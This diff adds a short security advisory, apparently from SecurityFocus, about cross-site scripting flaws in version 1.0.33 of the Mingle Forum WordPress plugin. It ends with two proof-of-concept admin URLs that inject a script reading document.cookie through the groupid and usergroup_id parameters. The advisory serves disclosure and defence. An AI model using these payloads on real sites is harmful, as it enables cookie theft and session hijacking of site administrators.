@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/53529/info
+
+The Mingle Forum plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Mingle Forum 1.0.33 is vulnerable; other versions may also be affected.
+
+http://www.example.com/wp-admin/admin.php?page=mfstructure&amp;mingleforum_action=structure&amp;do=addforum&amp;groupid=%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/wp-admin/admin.php?page=mfgroups&amp;mingleforum_action=usergroups&amp;do=edit_usergroup&amp;usergroup_id=1%27%3%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
